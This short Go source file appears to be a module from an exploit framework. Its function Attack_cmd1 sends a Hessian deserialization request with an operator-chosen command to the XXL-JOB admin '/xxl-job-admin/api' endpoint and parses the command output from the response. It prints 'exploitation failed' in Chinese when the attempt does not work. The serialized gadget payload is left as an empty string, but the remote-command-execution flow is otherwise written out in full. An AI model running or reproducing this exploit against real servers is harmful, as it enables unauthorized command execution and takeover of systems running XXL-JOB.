func (self *Exp_api) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	headers := self.GetInitExpHeaders()
	headers.Set("Content-Type", "x-application/hessian")
	yso, _ := base64.StdEncoding.DecodeString("")
	self.AddEncodeCmdHeader(headers, cmd)
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/xxl-job-admin/api"), string(yso)+"NN", headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	self.EchoDebugMsg(httpresp.Resp.Header.Get("Transfer-encoded"))
	if self.CheckRespHeader(httpresp.Resp.Header) {
		expResult.Status = true
		result, err := self.ParserEncodeCmdResult(httpresp.Body)
		if err != nil {
			expResult.Err = err.Error()
			return
		}
		self.EchoInfoMsg(result)
	} else {
		self.EchoErrMsg("利用失败")
	}

	return
}

